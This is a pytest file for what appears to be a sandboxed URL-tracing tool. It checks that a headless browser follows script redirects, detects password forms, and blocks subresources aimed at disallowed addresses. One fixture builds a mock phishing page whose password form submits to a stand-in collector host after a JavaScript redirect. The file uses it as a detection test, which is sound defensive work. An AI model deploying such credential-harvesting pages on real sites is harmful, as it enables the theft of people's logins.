import base64

import pytest

from unhook_sandbox import browser, guard

pytestmark = pytest.mark.browser


def _chromium_works() -> bool:
    if not browser.available():
        return False
    from playwright.sync_api import sync_playwright

    try:
        with sync_playwright() as p:
            p.chromium.launch(args=["--no-sandbox"]).close()
        return True
    except Exception:  # noqa: BLE001 - any launch failure just means "skip these tests"
        return False


if not _chromium_works():
    pytest.skip("no Playwright Chromium here", allow_module_level=True)


def test_script_driven_redirects_and_forms_are_seen(site, lab):
    site.add("/", "<title>Loading</title><script>setTimeout(() => location.href = '/login', 100)</script>")
    site.add("/login", '<title>Sign in</title><form action="https://collector.example/x"><input type=password></form>'
                       "<p>Please sign in</p>")
    r = browser.trace(site.url("/"), lab)
    assert r["mode"] == "browser" and r["final_url"].endswith("/login")
    assert r["title"] == "Sign in" and r["password_form"] and r["form_hosts"] == ["collector.example"]
    assert base64.b64decode(r["screenshot_b64"])[:2] == b"\xff\xd8"  # a JPEG
    assert [h["url"].rsplit("/", 1)[-1] for h in r["hops"]] == ["", "login"]


def _page_with_outside_resources(site, other_site):
    other_site.add("/pixel", "x")
    site.add("/", f'<title>t</title><img src="{other_site.url("/pixel")}"><script src="{other_site.url("/x.js")}"></script>')


def test_subresources_are_fetched_when_policy_allows_them(site, other_site, lab):
    _page_with_outside_resources(site, other_site)  # control for the test below
    browser.trace(site.url("/"), lab)
    assert "/pixel" in [path for path, _ in other_site.hits]


def test_subresources_pointing_inside_are_blocked(monkeypatch, site, other_site, lab):
    monkeypatch.setattr(guard, "ip_allowed", lambda addr, allow_private=False: addr == "127.0.0.1")
    _page_with_outside_resources(site, other_site)
    r = browser.trace(site.url("/"), lab)
    assert r["title"] == "t" and other_site.hits == []


def test_a_refused_start_url_never_connects(monkeypatch, site, lab):
    monkeypatch.setattr(guard, "ip_allowed", lambda addr, allow_private=False: False)
    site.add("/", "<title>nope</title>")
    r = browser.trace(site.url("/"), lab)
    assert r["error"].startswith("refused") and site.hits == []
